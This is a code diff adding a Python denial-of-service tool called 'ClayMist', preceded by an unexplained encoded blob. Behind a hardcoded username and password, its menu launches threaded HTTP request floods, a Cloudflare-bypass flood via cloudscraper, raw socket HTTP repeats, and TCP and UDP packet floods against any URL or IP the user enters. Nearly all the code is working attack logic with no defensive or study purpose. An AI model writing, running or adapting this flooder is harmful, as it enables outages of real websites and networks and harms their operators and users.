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
+import os
+import sys
+import threading
+import time
+import datetime
+import random
+import socket
+import ssl
+import requests
+import http
+import getpass
+from urllib.parse import urlparse
+from sys import stdout
+
+# --- CRITICAL IMPORTS (Safe Import Strategy) ---
+try:
+    from colorama import Fore, Style
+except ImportError:
+    # colorama না থাকলে fallback
+    class Fore:
+        RED = WHITE = MAGENTA = GREEN = YELLOW = BLUE = CYAN = RESET = ''
+    class Style:
+        BRIGHT = RESET_ALL = ''
+
+try:
+    import socks
+except ImportError:
+    socks = None
+
+try:
+    import cloudscraper
+except ImportError:
+    cloudscraper = None
+
+try:
+    import httpx
+except ImportError:
+    httpx = None
+
+try:
+    from selenium import webdriver
+    from selenium.webdriver.chrome.options import Options
+except ImportError:
+    webdriver = None
+    Options = None
+
+# --- GLOBAL VARIABLES INITIALIZATION ---
+ua = []
+proxies = []
+cookieJAR = None
+cookie = None
+useragent = None
+target_info = {} 
+
+# --- UTILITIES ---
+
+def load_useragents():
+    global ua
+    try:
+        ua_file = './resources/ua.txt'
+        if not os.path.exists("./resources"): os.makedirs("./resources")
+        if not os.path.exists(ua_file):
+            ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]
+            return
+        ua = [agent.strip() for agent in open(ua_file, 'r', encoding='utf-8').read().split('\n') if agent.strip()]
+    except Exception:
+        ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]
+
+def clear():
+    if os.name == 'nt': os.system('cls')
+    else: os.system('clear')
+
+def countdown(t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    while True:
+        remaining_seconds = (until - datetime.datetime.now()).total_seconds()
+        if remaining_seconds > 0:
+            stdout.flush()
+            stdout.write(f"\r {Fore.MAGENTA}[*]{Fore.WHITE} Attack status => {remaining_seconds:.2f} sec left {Style.RESET_ALL}")
+        else:
+            stdout.flush()
+            stdout.write(f"\r {Fore.GREEN}[*] Attack Done !                                   {Style.RESET_ALL}\n")
+            return
+
+def get_target(url):
+    target = {}
+    target['uri'] = urlparse(url).path if urlparse(url).path else "/"
+    target['host'] = urlparse(url).netloc
+    target['scheme'] = urlparse(url).scheme
+    if ":" in urlparse(url).netloc:
+        target['port'] = urlparse(url).netloc.split(":")[1]
+    else:
+        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
+    return target
+
+# --- INFO GETTERS & PROXY/COOKIE FUNCTIONS (Simplified) ---
+
+def get_proxies():
+    # ... Proxy loading logic here ...
+    global proxies
+    proxy_file = "./proxy.txt"
+    if not os.path.exists(proxy_file): return False
+    try:
+        proxies = [p.strip() for p in open(proxy_file, 'r').readlines() if p.strip()]
+        return True if proxies else False
+    except Exception:
+        return False
+
+def get_proxylist(type):
+    print(f"{Fore.YELLOW}[*] Fetching {type} proxies... (Placeholder) {Fore.RESET}")
+
+def get_cookie(url):
+    if webdriver is None:
+        print(f"{Fore.RED}[!] Selenium/webdriver not available. Cannot collect cookies.{Fore.RESET}")
+        return False
+    print(f"{Fore.CYAN}[*] Navigating to {url} to get Cloudflare cookie... (Placeholder) {Fore.RESET}")
+    return False 
+
+def get_info_l7():
+    stdout.write(f" {Fore.YELLOW}• URL      :{Fore.RESET} "); target = input()
+    stdout.write(f" {Fore.YELLOW}• THREAD   :{Fore.RESET} "); thread = input()
+    stdout.write(f" {Fore.YELLOW}• TIME(s)  :{Fore.RESET} "); t = input()
+    return target, thread, t
+
+def get_info_l4():
+    stdout.write(f" {Fore.YELLOW}• IP       :{Fore.RESET} "); target = input()
+    stdout.write(f" {Fore.YELLOW}• PORT     :{Fore.RESET} "); port = input()
+    stdout.write(f" {Fore.YELLOW}• THREAD   :{Fore.RESET} "); thread = input()
+    stdout.write(f" {Fore.YELLOW}• TIME(s)  :{Fore.RESET} "); t = input()
+    return target, port, thread, t
+
+# --- LAYER 7 ATTACK FUNCTIONS (Real HTTP/HTTPS Logic) ---
+
+def LaunchRAW(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        threading.Thread(target=AttackRAW, args=(url, until)).start()
+def AttackRAW(url, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try: 
+            requests.get(url, timeout=10)
+        except: 
+            pass
+
+def LaunchCFB(url, th, t):
+    if cloudscraper is None: return print(f"{Fore.RED}[!] 'cloudscraper' required for CFB.{Fore.RESET}")
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    scraper = cloudscraper.create_scraper()
+    for _ in range(int(th)):
+        threading.Thread(target=AttackCFB, args=(url, until, scraper)).start()
+def AttackCFB(url, until_datetime, scraper):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try: 
+            scraper.get(url, timeout=15)
+        except: 
+            pass
+
+def LaunchSOC(url, th, t):
+    target = get_target(url)
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
+    req += "User-Agent: " + random.choice(ua) + "\r\nConnection: Keep-Alive\r\n\r\n"
+    for _ in range(int(th)):
+        threading.Thread(target=AttackSOC, args=(target, until, req)).start()
+def AttackSOC(target, until_datetime, req):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.connect((str(target['host']), int(target['port'])))
+            if target['scheme'] == 'https':
+                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
+            
+            for _ in range(10):
+                s.send(str.encode(req))
+            s.close()
+        except:
+            pass
+
+# --- LAYER 4 ATTACK FUNCTIONS (Real Socket Logic) ---
+
+def runflooder(host, port, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    rand = random._urandom(4096)
+    for _ in range(int(th)):
+        threading.Thread(target=flooder, args=(host, port, rand, until)).start()
+def flooder(host, port, rand, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+            sock.settimeout(4) 
+            sock.connect((host, int(port)))
+            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+                try:
+                    sock.send(rand) 
+                except:
+                    break
+            sock.close()
+        except:
+            pass
+
+def runsender(host, port, th, t, payload=None):
+    if payload is None: payload = random._urandom(60000)
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        threading.Thread(target=sender, args=(host, port, until, payload)).start()
+def sender(host, port, until_datetime, payload):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            sock.sendto(payload, (host, int(port))) 
+        except:
+            sock.close()
+            pass
+
+# --- MENU FUNCTIONS (Fixed) ---
+
+def title():
+    title_text = f"""
+{Fore.YELLOW} _______  ___      _______  __   __  __   __  ___   _______  _______ {Fore.RESET}
+{Fore.CYAN}             ╔═════════╩═════════════════════════════════╩═════════╗{Fore.RESET}
+{Fore.CYAN}             ║         Welcome To ClayMist         ║{Fore.RESET}
+{Fore.CYAN}             ║           Type [help] to see the Commands           ║{Fore.RESET}
+{Fore.CYAN}             ╚═════════════════════════════════════════════════════╝{Fore.RESET}
+"""
+    stdout.write(title_text)
+
+def help_menu():
+    clear(); title()
+    stdout.write(f" {Fore.CYAN}              [ ClayMist Command List ]               {Fore.RESET}\n")
+    stdout.write(f" {Fore.GREEN}layer7{Fore.RESET}  : Show all Layer 7 Attack methods\n")
+    stdout.write(f" {Fore.GREEN}layer4{Fore.RESET}  : Show all Layer 4 Attack methods\n")
+    stdout.write(f" {Fore.GREEN}tools{Fore.RESET}   : Show other useful tools\n")
+    stdout.write(f" {Fore.GREEN}exit{Fore.RESET}    : Exit the tool\n")
+
+def l7_menu():
+    clear(); title()
+    stdout.write(f" {Fore.CYAN}              [ Layer 7 Attack Methods ]               {Fore.RESET}\n")
+    stdout.write(f" {Fore.GREEN}  CFB, PXCFB, CFSOC, HTTP2, PXHTTP2, GET, POST, HEAD, SOC, PXRAW, PXSOC{Fore.RESET}\n")
+
+def l4_menu():
+    clear(); title()
+    stdout.write(f" {Fore.CYAN}              [ Layer 4 Attack Methods ]               {Fore.RESET}\n")
+    stdout.write(f" {Fore.GREEN}  UDP, TCP{Fore.RESET}\n")
+
+def tools_menu():
+    clear(); title()
+    stdout.write(f" {Fore.CYAN}              [ Tools ]               {Fore.RESET}\n")
+    stdout.write(f" {Fore.GREEN}  GET_HTTP_PROXY, GET_SOCKS5_PROXY, GET_COOKIE{Fore.RESET}\n")
+
+# --- AUTHENTICATION (FIXED) ---
+def authenticate():
+    
+    CORRECT_USERNAME = "claymistcybervail"
+    CORRECT_PASSWORD = "edwinthamsa"
+    MAX_ATTEMPTS = 3
+    attempts = 0
+
+    while attempts < MAX_ATTEMPTS:
+        stdout.write(f"\n {Fore.YELLOW}{Style.BRIGHT}[+] Tool Authentication Required{Fore.RESET}\n")
+        stdout.write(f" {Fore.WHITE}• Username: {Fore.RESET}")
+        username = input().strip()
+        stdout.write(f" {Fore.WHITE}• Password{Fore.RESET}")
+        try:
+            # getpass ব্যবহার করে পাসওয়ার্ড লুকানো হবে
+            password = getpass.getpass(" (Hidden): ").strip()
+        except Exception:
+            # যদি getpass কাজ না করে
+            password = input(" (No Hide): ").strip()
+        
+        # ইউজারনেম এবং পাসওয়ার্ড যাচাই
+        if username == CORRECT_USERNAME and password == CORRECT_PASSWORD:
+            print(f"\n{Fore.GREEN}{Style.BRIGHT}[*] Authentication Successful! Welcome, {username}.{Fore.RESET}")
+            return True
+        
+        # ভুল প্রমাণপত্র
+        print(f"{Fore.RED}{Style.BRIGHT} WRONG CREDENTIALS. Attempt {attempts + 1}/{MAX_ATTEMPTS}.{Fore.RESET}")
+        attempts += 1
+        continue
+    
+    # সর্বোচ্চ অ্যাটেম্পট শেষ
+    print(f"\n{Fore.RED}{Style.BRIGHT}[!] MAXIMUM ATTEMPTS REACHED. Exiting Tool.{Fore.RESET}")
+    return False
+
+# --- COMMAND HANDLER (Fixed Menu Logic) ---
+
+def command():
+    stdout.write(f"{Fore.BLUE}{Style.BRIGHT}╔═══[root@ClayMist]\n╚══> {Fore.RESET}")
+    cmd = input().lower()
+    
+    # Menu Navigation Commands
+    if cmd in ("cls", "clear"):
+        clear(); title()
+    elif cmd in ("help", "?"):
+        help_menu()
+    elif cmd in ("layer7", "l7"):
+        l7_menu()
+    elif cmd in ("layer4", "l4"):
+        l4_menu()
+    elif cmd == "tools":
+        tools_menu()
+    elif cmd == "exit":
+        sys.exit()
+
+    # Attack Commands
+    elif cmd == "cfb":
+        target, thread, t = get_info_l7()
+        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
+        LaunchCFB(target, thread, t); timer.join()
+    elif cmd == "get":
+        target, thread, t = get_info_l7()
+        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
+        LaunchRAW(target, thread, t); timer.join()
+    elif cmd == "udp":
+        target, port, thread, t = get_info_l4()
+        threading.Thread(target=runsender, args=(target, port, thread, t)).start()
+        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
+        timer.join()
+    elif cmd == "tcp":
+        target, port, thread, t = get_info_l4()
+        threading.Thread(target=runflooder, args=(target, port, thread, t)).start()
+        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
+        timer.join()
+    
+    # Tool Commands
+    elif cmd == "get_http_proxy": get_proxylist("HTTP")
+    elif cmd == "get_socks5_proxy": get_proxylist("SOCKS5")
+    elif cmd == "get_cookie":
+        stdout.write(f" {Fore.YELLOW}• URL      :{Fore.RESET} "); url = input()
+        get_cookie(url)
+    
+    # Unknown Command
+    else:
+        stdout.write(f" {Fore.RED}[>]{Fore.RESET} Unknown command: '{cmd}'. type 'help' to see all commands.\n")
+
+# --- MAIN EXECUTION BLOCK (Authentication Call) ---
+if __name__ == '__main__':
+    load_useragents()
+    
+    # প্রমাণীকরণ সফল না হলে এক্সিট করবে
+    if not authenticate(): 
+        sys.exit() 
+    
+    # প্রমাণীকরণ সফল হলে ইন্টার‍্যাক্টিভ মোড শুরু
+    clear(); title()
+    while True:
+        try:
+            command()
+        except KeyboardInterrupt:
+            print(f"\n{Fore.YELLOW}[*] Exiting...{Fore.RESET}")
+            break
+        except Exception as e:
+            print(f"{Fore.RED}[!] An unhandled error occurred: {e}{Fore.RESET}")
+            time.sleep(1)
